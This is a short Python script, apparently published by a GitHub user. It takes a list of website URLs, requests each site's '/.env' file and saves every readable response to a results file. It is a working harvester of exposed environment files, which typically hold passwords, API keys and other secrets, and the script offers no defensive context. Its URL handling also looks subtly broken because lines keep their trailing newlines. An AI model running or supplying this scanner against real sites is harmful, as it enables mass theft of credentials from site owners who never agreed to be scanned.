#############
# https://github.com/BlueStrawBerrys
############

import requests
from datetime import datetime

time = datetime.now()
asss = '/.env'
path = input("Enter File Path: ")
urls = open(f'{path}')
try:

    for line in urls:
      
        if line[-1] == "/":
            print(' URL Has "/" at the End')
            continue

        a = requests.get(line+asss)
      
        if a.status_code < 400:

            with open(f"{time}_results.txt", "a") as wr:
                wr.write(f"[\n\n\tURL: {line},\n\n\tTIME: {time},\n\n\tCONTENT: \n(\n{a.text}\n)\n\n]\n\n\n\n")
          
            print(f"\n\nHit!: {line} | Saved Content in {time}_results.txt!\n\n")
          
        else:
            print(f"Failed: {line}")

except Exception as e:
    print(e)